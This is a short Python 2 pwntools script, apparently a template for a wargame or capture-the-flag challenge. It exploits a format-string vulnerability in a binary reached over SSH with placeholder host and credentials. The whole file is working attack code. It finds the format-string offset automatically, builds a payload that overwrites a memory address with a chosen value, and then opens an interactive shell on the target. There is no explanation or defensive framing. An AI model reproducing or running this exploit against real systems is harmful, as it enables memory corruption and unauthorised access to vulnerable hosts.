#! /usr/bin/env python

from pwn import *

# Binary name, var to overwrite & data to overwrite:
check=0xbffffb00
overwrite=0xdeadbeef
binary='./binfile'

# SSH connexion:
ssh =  ssh(  
		host='target.org',
		port= 222,
		user='myuser',
		password='mypasswd')

# Get offset:
def exec_fmt(payload):
	process = ssh.process([binary, payload])
	ret= process.recvall()
	return ret[ret.find('output=[')+5:ret.find("]\nbye!") ]

autofmt = FmtStr(exec_fmt)
offset = autofmt.offset


# Build payload:
def send_fmt_payload(payload):
	print repr(payload)

fspayload= fmtstr_payload(offset, {check: overwrite}, write_size='byte')

# Sending payload and launch an interactive shell:
exploitation= ssh.process([binary, fspayload])
exploitation.interactive()
